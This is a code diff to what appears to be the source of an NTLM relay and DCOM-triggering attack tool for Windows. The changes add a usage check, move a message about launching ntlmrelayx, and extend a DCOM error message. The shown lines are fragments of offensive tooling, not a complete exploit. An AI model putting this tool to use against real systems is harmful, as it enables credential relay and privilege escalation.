@@ -38,7 +38,7 @@ struct THREAD_PARAMETERS
 
 int wmain(int argc, wchar_t** argv)
 {
-	int fModule = 0;
+	int fModule = -1;
 	wchar_t defaultRemoteHTTPRelayServerPort[] = L"80";
 	wchar_t defaultRogueOxidResolverIp[] = L"127.0.0.1";
 	wchar_t defaultRogueOxidResolverPort[] = L"9999";
@@ -119,6 +119,11 @@ int wmain(int argc, wchar_t** argv)
 		--argc;
 	}
 	
+	if (fModule == -1) {
+		usage();
+		exit(-1); 
+	}
+		
 	THREAD_PARAMETERS threads_params = {};
 	threads_params.remoteHTTPRelayServerIp = remoteHTTPRelayServerIp;
 	threads_params.remoteHTTPRelayServerPort = remoteHTTPRelayServerPort;
@@ -128,12 +133,12 @@ int wmain(int argc, wchar_t** argv)
 	HANDLE hThreadServer;
 	
 	if (fModule == 0 || fModule == 1) {
-		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
 		if (remoteHTTPRelayServerIp == NULL)
 		{
 			printf("[!] Remote HTTP Relay server ip must be set in module 0 and 1, set it with the -r flag.\n");
 			exit(-1);
 		}
+		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
 		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
 	}
 	else {
@@ -281,7 +286,7 @@ void TriggerDCOMWithSessionID(wchar_t* clsid_string)
 		if (status == CO_E_BAD_PATH)
 			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
 		else
-			printf("[!] Error. Trigger DCOM failed with status: 0x%x\n", status);
+			printf("[!] Error. Trigger DCOM failed with status: 0x%x - %s\n", status, message.c_str());
 		exit(-1);
 	}
 	//debug
